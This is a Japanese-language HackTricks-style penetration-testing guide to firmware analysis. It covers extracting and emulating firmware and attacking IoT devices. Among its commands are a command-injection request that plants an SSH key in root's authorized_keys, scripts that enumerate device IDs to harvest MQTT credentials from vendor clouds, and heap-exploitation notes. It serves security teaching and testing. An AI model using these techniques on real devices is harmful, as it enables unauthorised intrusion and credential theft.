# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Introduction**

### Related resources


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmwareは、ハードウェアコンポーネントとユーザーが操作するソフトウェアの間の通信を管理・補助することで、デバイスが正しく動作するようにする重要なソフトウェアです。これは不揮発性メモリに保存され、電源投入の瞬間からデバイスが重要な命令にアクセスできるようにし、その結果としてOSの起動につながります。Firmwareを調査し、必要に応じて改変することは、セキュリティ脆弱性を特定するうえで重要なステップです。

## **Gathering Information**

**Gathering information** は、デバイスの構成や使用している技術を理解するための重要な初期ステップです。このプロセスでは、次のデータを収集します。

- CPU architecture と実行している operating system
- Bootloader の詳細
- Hardware layout と datasheets
- Codebase metrics と source の場所
- 外部ライブラリと license type
- Update history と regulatory certifications
- Architecture と flow diagrams
- Security assessments と特定された vulnerabilities

この目的には、**open-source intelligence (OSINT)** ツールが非常に有用であり、利用可能な open-source software コンポーネントに対して手動および自動のレビューを行う分析も同様に重要です。 [Coverity Scan](https://scan.coverity.com) や [Semmle’s LGTM](https://lgtm.com/#explore) のようなツールは、潜在的な問題を見つけるために活用できる無料の static analysis を提供します。

## **Acquiring the Firmware**

Firmware の入手方法にはいくつかあり、それぞれ複雑さが異なります。

- ソース（developers, manufacturers）から**直接**
- 提供された手順から**構築**
- 公式 support sites から**ダウンロード**
- ホストされた firmware files を見つけるために **Google dork** クエリを利用する
- [S3Scanner](https://github.com/sa7mon/S3Scanner) のようなツールで **cloud storage** に直接アクセスする
- man-in-the-middle techniques を使って **updates** を傍受する
- **UART**、**JTAG**、または **PICit** のような接続を通じてデバイスから **抽出** する
- デバイス通信内の update requests を **sniffing** する
- **hardcoded update endpoints** を特定して使用する
- Bootloader や network から **dumping** する
- 他の方法がすべて失敗した場合、適切な hardware tools を使って storage chip を**取り外して読み取る**

### UART-only logs: force a root shell via U-Boot env in flash

UART RX が無視される（logs only）場合でも、**U-Boot environment blob をオフラインで編集する**ことで init shell を強制できます。

1. SOIC-8 clip + programmer (3.3V) で SPI flash を dump します:
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. U-Boot env partition を見つけ、`bootargs` に `init=/bin/sh` を含めるように編集し、blob の **U-Boot env CRC32 を再計算** します。
3. env partition のみを書き戻して再起動すると、UART に shell が出現するはずです。

これは、bootloader shell が無効化されているが、外部 flash access 経由で env partition を書き込める embedded devices で有用です。

## Analyzing the firmware

今やあなたは **have the firmware** しているので、それをどう扱うべきかを知るために情報を抽出する必要があります。そのために使えるさまざまな tools:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
もしこれらのツールであまり見つからない場合は、`binwalk -E <bin>` で画像の **entropy** を確認してください。entropy が低ければ、暗号化されている可能性は低いです。entropy が高ければ、暗号化されているか、何らかの方法で圧縮されている可能性が高いです。

さらに、次のツールを使って **firmware 内に埋め込まれたファイル** を抽出できます:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

または、ファイルを調べるために [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) を使えます。

### Getting the Filesystem

前述の `binwalk -ev <bin>` のようなツールを使えば、**filesystem を抽出**できているはずです。\
Binwalk は通常、**filesystem の種類名を付けたフォルダ**内に抽出します。これは一般的に squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfs のいずれかです。

#### Manual Filesystem Extraction

場合によっては、binwalk がその filesystem の magic byte をシグネチャに持っていないことがあります。こうした場合は、binwalk を使って filesystem のオフセットを見つけ、binary から圧縮された filesystem を carve し、以下の手順に従ってその種類に応じて filesystem を手動で抽出してください。
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
dd コマンドを実行して Squashfs filesystem を carving します。
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
あるいは、以下のコマンドも実行できます。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs の場合（上の例で使用）

`$ unsquashfs dir.squashfs`

その後、ファイルは "`squashfs-root`" ディレクトリに配置されます。

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 filesystems の場合

`$ jefferson rootfsfile.jffs2`

- NAND flash を使う ubifs filesystems の場合

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analyzing Firmware

firmware を入手したら、その構造と潜在的な脆弱性を理解するために分解することが重要です。このプロセスでは、さまざまな tools を使って firmware image を分析し、価値のあるデータを抽出します。

### Initial Analysis Tools

binary file（`<bin>` と表記）を初期調査するための command 集が用意されています。これらの command は、file types の特定、strings の抽出、binary data の解析、partition と filesystem の詳細把握に役立ちます:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
イメージの暗号化状態を評価するには、`binwalk -E <bin>` で **entropy** を確認します。低い entropy は暗号化がないことを示唆し、高い entropy は暗号化または圧縮の可能性を示します。

**embedded files** を抽出するには、**file-data-carving-recovery-tools** のドキュメントや、ファイル解析用の **binvis.io** などのツールとリソースが推奨されます。

### Extracting the Filesystem

`binwalk -ev <bin>` を使うと、通常は filesystem を抽出でき、多くの場合は filesystem type にちなんだ名前のディレクトリ（例: squashfs, ubifs）に出力されます。ただし、magic bytes が不足しているために **binwalk** が filesystem type を認識できない場合は、手動での抽出が必要です。これは、まず `binwalk` で filesystem の offset を特定し、その後 `dd` コマンドで filesystem を切り出します:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
その後は、filesystem の種類（例: squashfs, cpio, jffs2, ubifs）に応じて、内容を手動で展開するために異なるコマンドを使います。

### Filesystem Analysis

filesystem を展開したら、security flaws の探索を開始します。insecure network daemons、hardcoded credentials、API endpoints、update server functionalities、uncompiled code、startup scripts、compiled binaries の offline analysis に注意を払います。

**Key locations** と **items** で確認すべきものは以下です:

- ユーザー credentials のための **etc/shadow** と **etc/passwd**
- **etc/ssl** 内の SSL certificates と keys
- 潜在的な vulnerabilities がある configuration と script files
- さらなる分析のための embedded binaries
- 一般的な IoT device web servers と binaries

いくつかの tools が、filesystem 内の sensitive information と vulnerabilities の発見を支援します:

- sensitive information search のための [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) と [**Firmwalker**](https://github.com/craigz28/firmwalker)
- 包括的な firmware analysis のための [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- static and dynamic analysis のための [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), と [**EMBA**](https://github.com/e-m-b-a/emba)

### Security Checks on Compiled Binaries

filesystem 内で見つかった source code と compiled binaries の両方を、vulnerabilities がないか精査する必要があります。Unix binaries 向けの **checksec.sh** や Windows binaries 向けの **PESecurity** のような tools は、攻撃可能な無防備な binaries を特定するのに役立ちます。

## Harvesting cloud config and MQTT credentials via derived URL tokens

多くの IoT hubs は、各 device ごとの configuration を次のような cloud endpoint から取得します:

- `https://<api-host>/pf/<deviceId>/<token>`

firmware analysis 中に、`<token>` が hardcoded secret を使って device ID から local に生成されていることが見つかる場合があります。たとえば:

- token = MD5( deviceId || STATIC_KEY ) で、uppercase hex で表現される

この設計により、deviceId と STATIC_KEY を知った人なら誰でも URL を再構築して cloud config を取得でき、しばしば plaintext の MQTT credentials と topic prefixes が明らかになります。

実践的な workflow:

1) UART boot logs から deviceId を抽出する

- 3.3V UART adapter (TX/RX/GND) を接続し、logs を取得します:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- cloud config URL pattern と broker address を出力している行を探します。例えば:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) firmware から STATIC_KEY と token algorithm をリカバーする

- binaries を Ghidra/radare2 に load し、config path ("/pf/") または MD5 usage を search する。
- algorithm を confirm する (例: MD5(deviceId||STATIC_KEY))。
- Bash で token を derive し、digest を uppercase する:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) cloud config と MQTT credentials を収集する

- URL を組み立てて curl で JSON を取得し、jq で secrets を抽出する:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) 平文 MQTT と弱い topic ACLs を悪用する（存在する場合）

- 復元した credentials を使って maintenance topics を subscribe し、機密性の高い events を探す:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 予測可能な device ID を列挙する（スケールして、許可を得て）

- 多くの ecosystem は、vendor OUI/product/type bytes の後に sequential suffix を埋め込んでいる。
- candidate ID を反復し、token を導出して、config を programmatically に取得できる:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- 大量列挙を試みる前に、必ず明示的な許可を取得すること。
- 可能な場合は、対象ハードウェアを変更せずに秘密情報を回収するため、emulation または static analysis を優先すること。


firmware を emulation する process により、デバイスの動作または個別の program のいずれかに対する **dynamic analysis** が可能になる。この approach は hardware や architecture 依存性で問題に直面することがあるが、root filesystem や特定の binaries を、Raspberry Pi のような同じ architecture と endianness を持つ device、または事前に構築された virtual machine に移すことで、さらなる testing を促進できる。

### Emulating Individual Binaries

単一の programs を調べる場合、program の endianness と CPU architecture を特定することが重要である。

#### Example with MIPS Architecture

MIPS architecture の binary を emulation するには、次の command を使用できる:
```bash
file ./squashfs-root/bin/busybox
```
そして、必要なエミュレーションツールをインストールするには:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
MIPS (big-endian) では `qemu-mips` が使われ、little-endian binaries では `qemu-mipsel` が選択肢になります。

#### ARM Architecture Emulation

ARM binaries では手順は同様で、`qemu-arm` emulator を emulation に使用します。

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) などの tools は、full firmware emulation を容易にし、process を自動化して dynamic analysis を支援します。

## Dynamic Analysis in Practice

この段階では、実機または emulated device environment のどちらかを analysis に使用します。OS と filesystem への shell access を維持することが重要です。Emulation は hardware interactions を完全には再現できないため、時々 emulation の再起動が必要になることがあります。Analysis では filesystem を再確認し、公開されている webpages と network services を exploit し、bootloader vulnerabilities を調べるべきです。Firmware integrity tests は、潜在的な backdoor vulnerabilities を特定するうえで重要です。

## Runtime Analysis Techniques

Runtime analysis では、gdb-multiarch、Frida、Ghidra などの tools を使って、その operating environment 内で process または binary と interaction し、breakpoints を設定し、fuzzing や他の techniques を通じて vulnerabilities を特定します。

完全な debugger がない embedded targets では、**statically-linked の `gdbserver` を device に copy** して、remote で attach します:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

IoT hubでは、RF stackはしばしば **radio MCU** と Linux userland process に分割されています。役立つワークフローは、以下の経路をマップすることです:

1. 空中の **RF frame**
2. radio MCU 上の **controller-side parser**
3. Linux に転送される **serial/UART text or TLV protocol**（たとえば `/dev/tty*`）
4. main daemon 内の **application dispatcher**
5. **protocol-specific handler / state machine**

このアーキテクチャにより、1つではなく2つの reversing target が生まれます。controller が binary radio frames を `Group,Command,arg1,arg2,...` のような textual protocol に変換するなら、次を復元します:

- **message groups** と dispatch tables
- どの message が **network** 由来で、どれが controller 自身から来るのか
- 正確な **manufacturer-specific discriminator fields**（たとえば Zigbee `manufacturer_code` と custom `cluster_command`）
- どの handler が **commissioning**, discovery, firmware/model download phase のときだけ到達可能か

Zigbee では特に、pairing traffic を capture して、ターゲットがまだ default **Link Key** `ZigBeeAlliance09` に依存しているか確認します。もしそうなら、commissioning traffic の sniffing で **Network Key** が露出する可能性があります。Zigbee 3.0 の install codes はこの露出を減らすので、実際にテスト対象デバイスがそれを強制しているかを確認してください。

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific な Zigbee/ZCL commands は、標準化された clusters よりも良いターゲットになりがちです。なぜなら、より少ない実戦経験しかない検証で **custom parsing code** と内部 **FSMs** に入るからです。

実践的なワークフロー:

- command dispatcher を reverse して、**vendor-only handler** を見つける。
- **FSM state**, **event**, **check**, **action**, **next-state** tables を復元する。
- 自動で進む **transitional states** と、最終的に attacker-controlled state を reset または free する retry/error branch を特定する。
- buggy handler が常に到達可能だと仮定せず、vulnerable state に daemon を置くために必要な正当な protocol exchange を確認する。

タイミングに敏感な protocol では、Python framework からの packet replay は遅すぎることがあります。より信頼できる方法は、vendor-grade stack を使って real hardware（たとえば **nRF52840**）上で正当な device を emulation し、正しい **endpoints**, **attributes**, commissioning timing を露出できるようにすることです。

### Fragmented-download bug class in embedded daemons

繰り返し現れる firmware bug class は、**fragmented blob/model/configuration downloads** にあります:

1. 最初の fragment (`offset == 0`) が `ctx->total_size` を保存し、`malloc(total_size)` を確保する。
2. 後続の fragment は、attacker-controlled な **packet-local** fields、たとえば `packet_total_size >= offset + chunk_len` だけを検証する。
3. copy は、**original allocated size** を確認せずに `memcpy(&ctx->buffer[offset], chunk, chunk_len)` を使う。

これにより attacker は次を送れます:

- **small** な declared total size を持つ最初の valid fragment を送り、小さな heap allocation を強制する。
- **expected offset** を持ちつつ、より大きい `chunk_len` の後続 fragment を送る。
- 新しいチェックを満たしつつ、最初に確保された buffer を still overflow する forged packet-local size。

vulnerable path が commissioning logic の背後にある場合、exploit には malformed fragments を送る前に target を期待される model-download または blob-download state に入れる十分な **device emulation** を含める必要があります。

### Protocol-driven `free()` triggers

embedded daemons では、heap metadata exploitation を引き起こす最も簡単な方法は、しばしば「cleanup を待つ」ことではなく、**protocol's own error handling** を強制することです:

- malformed な follow-up fragments を送り、FSM を **retry** または **error** state に押し込む。
- retry threshold を超えて daemon に **resets context** させ、破損した buffer を free させる。
- この予測可能な `free()` を使って、process が無関係な理由で crash する前に allocator-side primitives を発火させる。

これは特に embedded Linux の **musl/uClibc/dlmalloc-like** allocators に有効です。chunk metadata を破壊すると、unlink/unbin logic を write primitive に変えられるからです。安定したパターンは、size field を破壊して allocator traversal を **fake chunks staged inside the overflowed buffer** に向けることであり、real bin pointers を即座に潰して process を crash させることではありません。

## Binary Exploitation and Proof-of-Concept

特定した vulnerability に対する PoC を開発するには、target architecture の深い理解と、より低レベルな言語での programming が必要です。embedded systems の binary runtime protections はまれですが、存在する場合は Return Oriented Programming (ROP) のような technique が必要になることがあります。

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc は glibc に似た fastbins を使います。後の大きな allocation が `__malloc_consolidate()` を引き起こす可能性があるため、fake chunk は checks（妥当な size、`fd = 0`、周囲の chunks が "in use" と見なされること）を通過しなければなりません。
- **Non-PIE binaries under ASLR:** ASLR が有効でも main binary が **non-PIE** なら、binary 内の `.data/.bss` addresses は安定しています。すでに valid heap chunk header に似ている領域を狙って、fastbin allocation を **function pointer table** 上に着地させることができます。
- **Parser-stopping NUL:** JSON が parse されるとき、payload 内の `\x00` は parsing を止めつつ、後続の attacker-controlled bytes を stack pivot/ROP chain 用に残せます。
- **Shellcode via `/proc/self/mem`:** `open("/proc/self/mem")`, `lseek()`, `write()` を呼ぶ ROP chain により、既知の mapping に executable shellcode を配置してそこへ jump できます。

## Prepared Operating Systems for Firmware Analysis

[AttifyOS](https://github.com/adi0x90/attifyos) や [EmbedOS](https://github.com/scriptingxss/EmbedOS) のような operating systems は、必要な tools を備えた firmware security testing 用の pre-configured environment を提供します。

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS は、Internet of Things (IoT) devices に対する security assessment と penetration testing を支援するための distro です。必要な tools をすべて loaded した pre-configured environment を提供することで、多くの時間を節約できます。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): firmware security testing tools を事前に搭載した、Ubuntu 18.04 ベースの embedded security testing operating system です。

## Firmware Downgrade Attacks & Insecure Update Mechanisms

vendor が firmware images に cryptographic signature checks を実装していても、**version rollback (downgrade) protection は頻繁に省略されます**。boot- または recovery-loader が embedded public key で signature だけを検証し、flash しようとしている image の *version*（または monotonic counter）を比較しない場合、attacker は valid signature を持つ **older, vulnerable firmware** を正当に install でき、patched vulnerabilities を再導入できます。

典型的な attack workflow:

1. **Obtain an older signed image**
* vendor の public download portal, CDN, support site から取得する。
* companion mobile/desktop applications から抽出する（例: Android APK の `assets/firmware/` 内）。
* VirusTotal, internet archives, forums などの third-party repositories から取得する。
2. **Upload or serve the image to the device** を、公開されている任意の update channel 経由で行う:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* 多くの consumer IoT devices は、Base64-encoded firmware blobs を受け付け、server-side で decode して recovery/upgrade を起動する *unauthenticated* HTTP(S) endpoints を公開しています。
3. downgrade 後、より新しい release で修正された vulnerability を exploit する（例: 後から追加された command-injection filter）。
4. 必要なら最新 image を戻して flash するか、updates を disable して persistence 取得後の detection を避ける。

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
脆弱な（ダウングレードされた）ファームウェアでは、`md5` パラメータがサニタイズなしでそのまま shell command に連結されており、任意の command を注入できます（ここでは、SSH key-based root access を有効化しています）。後続の firmware バージョンでは基本的な文字フィルタが導入されましたが、downgrade protection がないため、この修正は無意味です。

### Extracting Firmware From Mobile Apps

多くの vendor は、付属の mobile application 内に完全な firmware image を同梱しており、app が Bluetooth/Wi-Fi 経由で device を update できるようにしています。これらの package は通常、APK/APEX 内の `assets/fw/` や `res/raw/` のような path に暗号化されずに保存されています。`apktool`、`ghidra`、あるいは単純な `unzip` のような tools を使えば、physical hardware に触れることなく signed images を取り出せます。
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### 更新ロジックを評価するためのチェックリスト

* *update endpoint* の transport/authentication は十分に保護されているか（TLS + authentication）?
* device は flash 前に **version numbers** または **monotonic anti-rollback counter** を比較するか?
* image は secure boot chain 内で検証されるか（例: ROM code によって signatures が確認される）?
* userland code は追加の sanity checks を行うか（例: 許可された partition map、model number）?
* *partial* または *backup* の update flow は同じ validation logic を再利用しているか?

> 💡  以上のいずれかが欠けている場合、その platform はおそらく rollback attacks に対して脆弱です。

## 研究用の脆弱な firmware

firmware で脆弱性を見つける練習をするため、以下の脆弱な firmware projects を出発点として使ってください。

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## トレーニングとCert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
